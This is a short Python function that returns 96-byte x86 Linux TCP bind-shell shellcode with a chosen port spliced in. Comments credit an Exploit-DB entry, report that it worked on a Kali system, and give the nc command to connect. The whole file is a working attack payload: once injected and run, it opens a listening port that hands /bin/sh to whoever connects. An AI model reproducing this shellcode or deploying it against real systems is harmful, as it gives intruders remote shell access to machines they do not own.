#https://www.exploit-db.com/exploits/36398/
#Linux x86 - TCP Bind Shell - 96 bytes
#Author: xmgv
#Details: https://xmgv.wordpress.com/2015/02/19/28/

#WORKED
#Linux 4.0.0-kali1-686-pae #1 SMP Debian 4.0.4-1+kali2 (2015-06-03) i686 GNU/Linux
#Connect : nc [TARGET] [PORT]
def tcp_bindx86( PORT):
	shellcode =  r"\x31\xdb\xf7\xe3\xb0\x66\xb3\x01\x52\x53\x6a\x02\x89\xe1\xcd\x80\x89\xc6\xb0"
	shellcode += r"\x66\x43\x52\x66\x68"
	shellcode += PORT
	shellcode += r"\x66\x53\x89\xe1\x6a\x10\x51\x56\x89\xe1\xcd\x80\xb0\x66\xb3\x04\x52\x56\x89"
	shellcode += r"\xe1\xcd\x80\xb0\x66\xb3\x05\x52\x52\x56\x89\xe1\xcd\x80\x93\x31\xc9\xb1\x02"
	shellcode += r"\xb0\x3f\xcd\x80\x49\x79\xf9\x92\x50\x68\x2f\x2f\x73\x68\x68\x2f\x62\x69\x6e"
	shellcode += r"\x89\xe3\x50\x53\x89\xe1\x50\x89\xe2\xb0\x0b\xcd\x80"
	return shellcode